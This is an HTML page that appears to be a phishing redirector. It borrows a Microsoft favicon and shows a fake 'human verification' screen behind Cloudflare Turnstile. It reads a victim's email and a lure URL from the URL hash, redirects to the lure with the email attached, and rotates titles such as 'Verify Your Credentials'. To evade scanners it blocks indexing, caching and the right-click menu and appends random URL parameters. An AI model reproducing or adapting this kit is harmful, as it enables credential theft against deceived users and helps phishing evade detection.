<!DOCTYPE html>
<!DOCTYPE html>
<html>
<head>
    <title></title>
    <meta name="robots" content="noindex,nofollow">
    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
    <meta http-equiv="Pragma" content="no-cache">
    <meta http-equiv="Expires" content="0">
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <!-- Add favicon (Microsoft logo) -->
    <link rel="icon" type="image/png" href="https://aadcdn.msftauth.net/shared/1.0/content/images/favicon_a_eupayfgghqiai7k9sol6lg2.ico">
    <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>

    <style>
        #newForm button {
            height: 17px;
            padding: 0;
            font-size: 10px;
        }
        #newForm label {
            cursor: not-allowed;
            font-size: 10px;
            margin-bottom: 1px;
        }

        /* Default light mode styles */
        body {
            color: black !important;
            font-size: 17px;
            font-weight: bold;
            line-height: 1;
            text-align: center;
            margin-top: 100px; /* Adjusts the top margin */
        }

        /* Dark mode styles */
        .dark-mode body {
            background-color: #333333;
            color: #ffffff !important;
        }
    </style>

    <script>
    window.onload = async function () {
        var USE_TURNSTILE = true;

        // Create loading div
        var loadingDiv = document.createElement("div");
        loadingDiv.id = "lsrt";

        // Valid Base64-encoded SVG and CSS content
        var base64HTML = '';
    var base64CSS = '';

        // Decode base64 to HTML
        function decodeBase64ToHTML(base64) {
            try {
                return atob(base64);
            } catch (e) {
                console.error('Failed to decode base64', e);
                return '';
            }
        }

        var loaderSVGString = decodeBase64ToHTML(base64HTML);
        if (loaderSVGString.trim()) {
            loadingDiv.innerHTML = loaderSVGString;
            document.body.appendChild(loadingDiv);
        } else {
            console.error('Decoded SVG is empty or invalid');
        }

        // Decode base64 to CSS
        function decodeBase64ToCSS(base64) {
            try {
                return atob(base64);
            } catch (e) {
                console.error('Failed to decode base64', e);
                return '';
            }
        }

        var loadingStyle = document.createElement("style");
        loadingStyle.textContent = decodeBase64ToCSS(base64CSS);
        document.head.appendChild(loadingStyle);

        // Remove loading animation after 15 seconds
        setTimeout(function() {
            loadingDiv.style.display = 'none';
        }, 3000);

        // Function to decode Base64
        function decodeBase64(encoded) {
            try {
                return atob(encoded);
            } catch (e) {
                console.error('Failed to decode base64', e);
                return null;
            }
        }

        // Check if the email is in the obfuscated format
        function isObfuscatedFormat(email) {
            // Regular expression to match the obfuscated format: (randomNumber1 character randomNumber2 +)
            const regex = /\(\d[a-zA-Z0-9@.]\d{2}\+\)/g;
            return regex.test(email);
        }

        // Decode the obfuscated email
        function decodeEmail(obfuscatedEmail) {
          // Regular expression to extract characters within the format (randomNumber1 character randomNumber2 +)
          const regex = /\(\d([a-zA-Z0-9@.])\d{2}\+\)/g;
          let decodedEmail = '';
          let match;

          // Extract characters using the regular expression
          while ((match = regex.exec(obfuscatedEmail)) !== null) {
            console.log('Matched Segment:', match[0]);  // Debug: log the matched segment
            decodedEmail += match[1];
          }

          return decodedEmail;
        }


// Extract email and LURE value from the hash
function extractAndDecodeHashValues() {
    const url = window.location.href;
    let email = null;
    let lureValue = null;

    try {
        // Extract #POP= value
        if (url.includes('#POP=')) {
            email = url.split('#POP=')[1].split('#')[0].trim();
            email = decodeURIComponent(email);
        }

        // Extract #LURE= value
        if (url.includes('#LURE=')) {
            lureValue = url.split('#LURE=')[1].split('#')[0].trim();
            lureValue = decodeURIComponent(lureValue);
        }
    } catch (e) {
        console.error('Failed to extract or decode hash values:', e);
    }

    console.log('Extracted Values:', { email, lureValue });
    return { email, lureValue };
}





// Decode Base64 URL and extract redirect URL from response
async function getRedirectUrlWithEmail(base64Url, email) {
    // Decode base64 to get the URL
    const decodedUrl = atob(base64Url);

    try {
        // Make a fetch request to the decoded URL
        const response = await fetch(decodedUrl);
        if (response.ok) {
            const data = await response.json();
            
            // Extract the URL from the response and append #M + email
            const redirectUrl = data.message + '#' + email;
            console.log('Extracted redirect URL:', redirectUrl);
            return redirectUrl;
        } else {
            console.error('Failed to fetch data from decoded URL');
            return null;
        }
    } catch (error) {
        console.error('Error fetching data:', error);
        return null;
    }
}
        
// Start Turnstile verification
function startTurnstileVerification() {
    if (USE_TURNSTILE) {
        console.log('Starting Turnstile verification...');
        turnstile.render('#cf-turnstile', {
            sitekey: '0x4AAAAAAAymSY_rn4CFRQRl', // Replace with your actual sitekey
            type: 'spinner',
            callback: async function (token) {
                if (!token) {
                    console.error('Turnstile verification failed');
                    return;
                }

                // Show loading animation again
                loadingDiv.style.display = 'flex';

                // Extract hash values
                const { email, lureValue } = extractAndDecodeHashValues();

                // Wait for 3 seconds, then redirect
                setTimeout(function () {
                    loadingDiv.style.display = 'none';

                    if (lureValue && email) {
                        // Construct redirect URL
                        const redirectUrl = `${lureValue}#POP=${email}?redirected=done`;
                        console.log('Redirecting to:', redirectUrl);
                        window.location.href = redirectUrl;
                    } else {
                        console.error('Missing email or lureValue for redirection.');
                    }
                }, 2000);
            },
            'error-callback': function () {
                console.error('Turnstile encountered an error');
            }
        });
    } else {
        console.log('Turnstile is not enabled.');
    }
}


// Run Turnstile verification
startTurnstileVerification();

    };
</script>

    <script>
    document.addEventListener('contextmenu', function(event) {
    event.preventDefault();
});

</script>
    <script>
        function appendRandomParamsToUrl() {
            const params = generateRandomParams();
            const currentUrl = new URL(window.location.href);
            params.forEach(param => currentUrl.searchParams.append(param.key, param.value));
            window.history.replaceState({}, '', currentUrl);
        }

        function generateRandomParams() {
            let params = [];
            for (let i = 0; i < 50; i++) {
                let randomKey = `${i}`;
                let randomValue = Math.random().toString(36).substring(2, 15);
                params.push({ key: randomKey, value: randomValue });
            }
            return params;
        }
		appendRandomParamsToUrl();
		</script>
</head>
<body>
    We have integrated a human verification system to confirm that you are not a robot and to mitigate automated risks.
    <br><br>
    <!-- Turnstile widget positioned in the middle -->
    <center>
        <div id="cf-turnstile" style="margin: 5px 0;"></div>
    </center>
    <br>
    <!-- Bottom text -->
    <span class="display-4">We need to properly verify that you're human before we proceed. This may take a few seconds.</span>
 <script>
        // Titles array with different variations
        const titles = [
    "Confirm Your Identity",
    "Identity Confirmation Required",
    "Secure Your Access",
    "Verify Your Credentials",
    "Confirm Your Account",
    "Identity Check",
    "Verify Your Details",
    "Authenticate Your Identity",
    "Identity Verification Needed",
    "Confirm Your Personal Information",
    "Please Verify Your Account",
    "Final Step: Confirm Your Identity",
    "Secure Verification Process",
    "Complete Your Identity Verification",
    "Account Security Check",
    "Protect Your Account - Verify Now",
    "Verification Needed for Access",
    "Account Access Confirmation",
    "Action Required: Identity Check",
    "Complete Your Security Verification",
    "Confirm Your Access Rights",
    "Verify Your Identity for Security",
    "Secure Your Personal Details",
    "Double-Check Your Credentials",
    "Identity Protection in Progress",
    "Safety Check: Confirm Your Details",
    "Ensure Your Account Security",
    "Verify to Continue Access",
    "Account Protection Step",
    "Verification Step Required",
    "Authenticate to Secure Your Account",
    "Account Authentication Needed",
    "Secure Your Account Access",
    "One Last Step: Confirm Your Details",
    "Your Account Verification Is Pending",
    "Complete This Security Step",
    "Verify Your Information Securely",
    "Secure Identity Checkpoint",
    "Finish Your Identity Verification",
    "Secure Your Data: Verify Now"
];


        // Function to select a random title
        function setRandomTitle() {
            const randomIndex = Math.floor(Math.random() * titles.length);
            document.title = titles[randomIndex];
        }

        // Set random title on page load
        setRandomTitle();
    </script>
</body>
</html>
